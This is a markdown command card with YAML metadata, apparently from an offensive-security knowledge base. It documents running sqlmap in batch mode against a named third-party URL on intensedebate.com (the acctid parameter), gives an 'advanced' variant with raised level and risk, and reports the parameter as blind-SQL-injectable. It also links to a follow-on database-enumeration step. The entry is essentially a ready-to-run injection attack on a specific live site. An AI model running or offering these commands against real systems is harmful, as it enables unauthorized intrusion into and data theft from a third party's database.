---
data: >-
  sqlmap --url https://www.intensedebate.com/js/importStatus.php?acctid=1
  --batch
tags:
  - sqli
  - testing
type: command
output: Detection of boolean-based blind and time-based blind SQLi
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.321Z'
id: 938d64bc-087f-4c43-8560-19aa8ed4b8b9
verified: false
validated: true
submitted: true
---
# sqlmap-initial-test

## Command

```bash
sqlmap --url https://www.intensedebate.com/js/importStatus.php?acctid=1 --batch
```

## Description

Initial automated test using sqlmap to detect SQL Injection vulnerabilities in the specified URL's parameters, running in batch mode for non-interactive detection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--url` | Target URL with injectable parameter | Yes |
| `--batch` | Non-interactive mode, accepts defaults | No |

## Examples

### Basic Usage

```bash
sqlmap --url https://www.intensedebate.com/js/importStatus.php?acctid=1 --batch
```

### Advanced Usage

```bash
sqlmap --url https://www.intensedebate.com/js/importStatus.php?acctid=1 --batch --level=3 --risk=2
```

## Expected Output

sqlmap will output detection results, such as 'Parameter: acctid (GET) Type: boolean-based blind, Time: MySQL >= 5.0.12'.

## Related

- [[commands/sqlmap-enumerate-databases]]
- [[procedures/Identify-Vulnerable-SQL-Injection-Parameter]]
